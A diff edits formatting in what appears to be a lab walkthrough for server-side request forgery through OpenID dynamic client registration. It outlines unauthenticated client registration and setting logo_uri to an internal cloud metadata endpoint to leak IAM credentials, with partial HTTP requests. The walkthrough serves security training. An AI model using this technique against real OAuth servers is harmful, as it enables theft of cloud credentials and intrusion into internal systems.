@@ -4,15 +4,16 @@ SSRF via OpenID dynamic client registration without using collaborator
 
 Step 1: Discover the OpenID Configuration (Optional but Recommended for Context)
 During the login flow, intercept a request to the OAuth server's /auth endpoint. Observe parameters like client_id, redirect_uri, scope (including openid), confirming OpenID Connect usage.Send a GET request to the OAuth server's /.well-known/openid-configuration endpoint:text
+
 Example: 
-In Chrome Browser open: 
 GET /.well-known/openid-configuration HTTP/1.1
 Host: oauth-<your-oauth-server>.oauth-server.net
 
 
 
 Step 2: Test Basic Client Registration
-In Burp Repeater, craft and send a POST request to the /reg endpoint to register a new client. No authentication is required:text
+In Burp Repeater, craft and send a POST request to the /reg endpoint to register a new client. No authentication is required.
+
 POST /reg HTTP/1.1
 Host: oauth-<your-oauth-server>.oauth-server.net
 Content-Type: application/json
@@ -24,7 +25,8 @@ Content-Length: 63
 
 
 Step 4: Exploit SSRF to Access Internal Metadata
-Register a new client, but set logo_uri to the internal AWS-like metadata endpoint to leak IAM credentials:text
+Register a new client, but set logo_uri to the internal AWS-like metadata endpoint to leak IAM credentials
+
 POST /reg HTTP/1.1
 Host: oauth-<your-oauth-server>.oauth-server.net
 Content-Type: application/json
